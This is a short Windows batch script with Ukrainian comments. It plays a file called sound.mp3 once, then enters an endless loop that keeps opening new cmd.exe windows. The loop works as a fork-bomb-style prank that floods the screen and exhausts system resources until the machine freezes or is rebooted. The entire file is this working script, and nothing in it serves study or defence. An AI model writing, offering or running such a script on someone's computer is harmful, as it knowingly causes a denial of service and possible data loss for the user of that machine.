@echo off
:: 1. Запускаємо музику один раз
start "" "sound.mp3"

:: 2. Створюємо мітку для циклу вікон
:loop
start cmd.exe
goto loop